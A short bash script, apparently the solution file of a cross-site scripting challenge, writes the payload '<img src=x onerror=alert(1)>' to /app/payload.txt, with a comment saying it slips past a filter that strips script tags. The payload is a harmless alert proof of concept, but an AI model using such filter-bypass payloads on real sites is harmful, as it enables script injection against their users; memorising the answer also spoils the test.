#!/bin/bash
set -euo pipefail

# <img src=x onerror=alert(1)> bypasses a <script>-stripping filter.
printf '%s\n' '<img src=x onerror=alert(1)>' > /app/payload.txt